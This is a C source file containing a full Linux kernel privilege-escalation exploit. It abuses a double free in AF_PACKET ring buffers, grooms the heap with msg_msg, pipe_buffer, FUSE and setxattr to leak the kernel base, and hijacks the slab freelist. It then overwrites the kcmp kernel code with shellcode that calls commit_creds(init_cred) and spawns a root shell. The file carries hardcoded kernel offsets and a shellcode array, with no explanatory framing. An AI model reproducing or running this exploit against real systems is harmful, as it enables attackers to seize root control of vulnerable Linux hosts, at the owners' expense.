#define _GNU_SOURCE
#include "libexp.h"

#define KADDR(x) x + kbase

#define TARGET_SIZE 0x400
#define TARGET_SIZE2 0x200
#define MSG_HEADER_SIZE 0x40

char* copy_map = 0;
char* block_map = 0;

pthread_mutex_t lock;

uint64_t kbase = 0;
uint64_t target_code = 0xffffffffbb0b80d0 - 0xffffffffbb000000;
uint64_t init_cred = 0xffffffffbc242160 - 0xffffffffbb000000;
uint64_t commit_creds = 0xffffffffbb07a3d0 - 0xffffffffbb000000;


/*
    mov rdi, init_cred
    mov rax, commit_creds
    call rax
    ret
*/
uint8_t shellcode[] = {
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
    0x90, 0x90, 0x48, 0xbf, 0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41, 0x48, 0xb8, 0x68, 0x67,
    0x66, 0x65, 0x64, 0x63, 0x62, 0x61, 0xff, 0xd0, 0x90, 0x90, 0x90, 0xc3
};

void _setup_fuse(void) {
    char* cmd = "mkdir -p /tmp/fuse_mount; /tmp/share/hello /tmp/fuse_mount";
    int fuse_fd = -1;
    int err;

    if(0 != system(cmd)) error("Failed fuse mount");

    fuse_fd = open("/tmp/fuse_mount/blah", O_RDWR);
    if (fuse_fd < 0) error("Failed to open fuse mount");
    

    copy_map = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (copy_map == MAP_FAILED) error("Failed to allocate copy map");
    info("copy_map: %p", copy_map);

    block_map = mmap(copy_map+PAGE, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd, 0);
    if (block_map != (copy_map+PAGE)) error("Failed to allocate contiguous map");
    info("block_map: %p", block_map);
}

void init(void) {
    pin_to_cpu(0);

    info("Setting up fuse");
    _setup_fuse();

    info("Entering sandbox");
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) error("unshare");
}

uint64_t leak_ktext() {
    int pkt_ver = 0;
    uint64_t base;
    int qid;
    int err;

    info("==================== Stage 1 ====================");

    // NOTE: linux kernel 4.14.190 wont panic on double free
    // Create a Packet socket
    info("Creating a socket");
    int sock = socket(AF_PACKET, SOCK_RAW, 0);
    if (sock < 0) error("socket");

    // set packet version
    pkt_ver = TPACKET_V3;
    err = setsockopt(sock, SOL_PACKET, PACKET_VERSION, &pkt_ver, sizeof pkt_ver);
    if (err < 0) error("setsockopt");

    // create a ring buffer
    union tpacket_req_u *req = (union tpacket_req_u*)malloc(sizeof(union tpacket_req_u));
    req->req3.tp_block_size = PAGE;
    req->req3.tp_block_nr = TARGET_SIZE / 8;
    req->req3.tp_frame_size = PAGE;
    req->req3.tp_frame_nr = TARGET_SIZE / 8;
    err = setsockopt(sock, SOL_PACKET, PACKET_RX_RING, req, sizeof(union tpacket_req_u));
    if (err < 0) error("setsockopt");

    // setting block_nr to 0 frees kmalloc-2k slab because 0x410
    info("Freeing pg_vec");
    memset(req, 0, sizeof(union tpacket_req_u));
    err = setsockopt(sock, SOL_PACKET, PACKET_RX_RING, req, sizeof(union tpacket_req_u));
    if (err < 0) error("setsockopt");

    // Recapture the free'd slab with msg_msgseg
    info("Recapturing free'd region with pipe_buffer");
    int pipe_fd[2];
    pipe(pipe_fd);
    char* buffer = malloc(PAGE);
    write(pipe_fd[1], buffer, PAGE);

    // change packet version to v2
    pkt_ver = TPACKET_V2;
    err = setsockopt(sock, SOL_PACKET, PACKET_VERSION, &pkt_ver, sizeof pkt_ver);
    if (err < 0) error("setsockopt");

    // setting block_nr to 0 frees the 2k slab again because we altered the packet version
    info("Freeing pipe_buffer");
    req->req3.tp_block_size = PAGE;
    req->req3.tp_block_nr = 1;
    req->req3.tp_frame_size = PAGE;
    req->req3.tp_frame_nr = 1;
    err = setsockopt(sock, SOL_PACKET, PACKET_RX_RING, req, sizeof(union tpacket_req_u));
    if (err < 0) error("setsockopt");


    // Repeating the process again to get overlapping msg_msgseg and pg_vec slabs
    // create a ring buffer
    info("Overlapping pipe_buffer with msg_msgseg");
    // msg_t *msg = malloc(sizeof(msg_t) + (PAGE+TARGET_SIZE-MSG_HEADER_SIZE));
    msg_t *msg = mmap(0, PAGE * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    msg->mtype = 0x1337;
    memset(msg->mtext, 0x40+1, PAGE);
    err = msgsnd(qid, msg, PAGE+TARGET_SIZE-MSG_HEADER_SIZE, IPC_NOWAIT);
    if (err < 0 ) error("msgsnd");

    for (int i = 0; i < 3; i++)
        write(pipe_fd[1], buffer, PAGE);

    info("Leaking pipe_buf_operations ptr");
    err = msgrcv(qid, msg->mtext, PAGE+TARGET_SIZE-MSG_HEADER_SIZE, 0, IPC_NOWAIT | MSG_COPY);
    if (err < 0) error("msgrcv");

    return ((uint64_t*)&msg->mtext[PAGE - MSG_HEADER_SIZE])[9] - 0xe18d00;
}

void *setxattr_worker() {
    pthread_mutex_lock(&lock);

    pin_to_cpu(0);
    setxattr("/tmp", "bb", block_map-8, TARGET_SIZE2, 0);
    info("not holding target page");
    while (1);
}

int main(void) {
    init();

    pthread_t thread;
    pthread_mutex_lock(&lock);
    pthread_create(&thread, NULL, setxattr_worker, NULL);

    kbase = leak_ktext();
    init_cred = KADDR(init_cred);
    commit_creds = KADDR(commit_creds);

    info("Leaked ktext: 0x%lx", kbase);
    info("init_cred: %p", init_cred);
    info("commit_creds: %p", commit_creds);
    info("Target code: %p", KADDR(target_code));

    info("==================== Stage 2 ====================");

    int pkt_ver = 0;
    uint64_t base;
    int qid;
    int err;

    uint32_t blocksiz = PAGE, framesiz = PAGE / 2;

    info("Creating a socket");
    int sock = socket(AF_PACKET, SOCK_RAW, 0);
    if (sock < 0) error("socket");

    // set packet version
    pkt_ver = TPACKET_V3;
    err = setsockopt(sock, SOL_PACKET, PACKET_VERSION, &pkt_ver, sizeof pkt_ver);
    if (err < 0) error("setsockopt");

    // create a ring buffer, allocates struct pg_vec on kmalloc-1k  slab
    union tpacket_req_u *req = (union tpacket_req_u*)malloc(sizeof(union tpacket_req_u));
    req->req3.tp_block_size = blocksiz;
    req->req3.tp_block_nr = TARGET_SIZE2 / 8;
    req->req3.tp_frame_size = framesiz;
    req->req3.tp_frame_nr = (blocksiz * (TARGET_SIZE2 / 8) / framesiz);
    err = setsockopt(sock, SOL_PACKET, PACKET_RX_RING, req, sizeof(union tpacket_req_u));
    if (err < 0) error("setsockopt");


    // occupy pg_vec1 with new target pg_vec
    info("Creating a target socket");
    int sock2 = socket(AF_PACKET, SOCK_RAW, 0);
    if (sock2 < 0) error("socket");

    // set packet version
    pkt_ver = TPACKET_V3;
    err = setsockopt(sock2, SOL_PACKET, PACKET_VERSION, &pkt_ver, sizeof pkt_ver);
    if (err < 0) error("setsockopt");


    // setting block_nr to 0 frees kmalloc-2k slab because 0x410
    info("Freeing pg_vec");
    memset(req, 0, sizeof(union tpacket_req_u));
    err = setsockopt(sock, SOL_PACKET, PACKET_RX_RING, req, sizeof(union tpacket_req_u));
    if (err < 0) error("setsockopt");

    // create a ring buffer, allocates struct pg_vec on kmalloc-1k  slab
    info("Allocating target ring_buffer");
    union tpacket_req_u *ring = (union tpacket_req_u*)malloc(sizeof(union tpacket_req_u));
    ring->req3.tp_block_size = blocksiz;
    ring->req3.tp_block_nr = TARGET_SIZE2 / 8;
    ring->req3.tp_frame_size = framesiz;
    ring->req3.tp_frame_nr = (blocksiz * (TARGET_SIZE2 / 8) / framesiz);
    ring->req3.tp_retire_blk_tov = 0xffffffff;      // You only get to do what ever you want for around 1h 10mins, then the kernel panics
    err = setsockopt(sock2, SOL_PACKET, PACKET_RX_RING, ring, sizeof(union tpacket_req_u));
    if (err < 0) error("setsockopt");


    // change packet version to v2
    pkt_ver = TPACKET_V2;
    err = setsockopt(sock, SOL_PACKET, PACKET_VERSION, &pkt_ver, sizeof pkt_ver);
    if (err < 0) error("setsockopt");

    // keeping it here just in case occupying free space is too slow
    for (int i = 0; i < (PAGE/8); i++)
        ((uint64_t*)copy_map)[i] = KADDR(0xffffffff8d600000 - 0xffffffff8c800000) + ((i+1) * PAGE);  // some kernel buffer I don't care
    
    // setting block_nr to 0 frees the 1k slab again because we altered the packet version
    // Now our target cache is free'd
    info("Freeing target pg_vec");
    memset(req, 0, sizeof(union tpacket_req_u));
    req->req3.tp_block_size = blocksiz;
    req->req3.tp_block_nr = 0;
    req->req3.tp_frame_size = framesiz;
    req->req3.tp_frame_nr = 0;
    err = setsockopt(sock, SOL_PACKET, PACKET_RX_RING, req, sizeof(union tpacket_req_u));
    if (err < 0) error("setsockopt");

    info("Changing pg_vec->buffer pointers to kernel code with setxattr");
    setxattr("/tmp", "aa", copy_map, TARGET_SIZE2, 0);

    // Overwrite the freelist pointer and block copy_from_user code
    info("Overwriting freelist pointer with fuse+setxattr");
    ((uint64_t*)copy_map)[0x200-1] = KADDR(target_code);  // its page aligned so idc
    pthread_mutex_unlock(&lock);

    usleep(100000);
    info("Allocating shared memory with kernel code");
    char *buffer = mmap(0, ring->req3.tp_block_size * ring->req3.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sock2, 0);
    info("Shared memory: 0x%lx", buffer);
    // memcpy(buffer, "I was able to edit this code\0", sizeof("I was able to edit this code\0"));

    info("==================== Stage 3 ====================");
    info("Writing shellcode to kcmp kernel code");

    memcpy(shellcode+0xd4, &init_cred, 8);
    memcpy(shellcode+0xde, &commit_creds, 8);

    memcpy(buffer, shellcode, sizeof(shellcode));

    syscall(SYS_kcmp);

    if (getuid() == 0) {
        info("I'm root!!!");
        system("/bin/bash");
    }

    noleave();
}
